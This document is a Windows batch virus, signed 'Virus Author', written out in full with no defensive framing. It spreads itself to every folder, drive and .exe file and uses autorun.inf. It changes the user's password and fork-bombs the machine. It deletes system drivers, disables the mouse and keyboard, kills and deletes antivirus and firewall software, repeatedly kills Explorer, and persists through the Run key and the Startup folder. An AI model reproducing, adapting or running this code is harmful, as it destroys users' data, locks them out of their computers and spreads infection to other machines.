@ echo off
rem ---------------------------------
rem Infect All Folders
Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul
rem ---------------------------------
rem ---------------------------------
rem Infect All Drives
for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)
rem ---------------------------------
rem ---------------------------------
rem Infect All .Exe Files
assoc .exe=batfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Hide Virus File After Run
attrib +h %0
rem ---------------------------------
rem ---------------------------------
rem Swap Mouse Buttons
RUNDLL32 USER32.DLL,SwapMouseButton
rem ---------------------------------
rem ---------------------------------
rem Change User Password To DELmE
net user %username% DELmE
rem ---------------------------------
rem ---------------------------------
rem Crash Computer
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
echo start "" %0>>crash.bat
start "" crash.bat
rem ---------------------------------
rem ---------------------------------
rem Activate Blue Screen Of Death
@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
rem ---------------------------------
rem ---------------------------------
rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem ---------------------------------
rem ---------------------------------
rem Disable Keyboard
echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
start "nokeyboard.reg"
rem ---------------------------------
rem ---------------------------------
rem Permanently Kill Anti-Virus
net stop �Security Center�
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
cls
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
cls
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
cls
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
cls
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
cls
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
cls
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.* 
rem ---------------------------------
rem ---------------------------------
rem Kill Explorer
echo :a >>explorer.bat
echo tskill explorer >>explorer.bat
echo goto a >>explorer.bat
echo Set objShell = CreateObject("WScript.Shell")>>invisi.vbs
echo strCommand = "explorer.bat">>invisi.vbs
echo objShell.Run strCommand, vbHide, TRUE>>invisi.vbs
start "" invisi.vbs
rem ---------------------------------
rem ---------------------------------
rem Infect Startup Folder
copy %0 "%userprofile%\Start Menu\Programs\Startup"
rem ---------------------------------
rem ---------------------------------
rem Infect All Folders
Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul
rem ---------------------------------


__-Virus Author: -__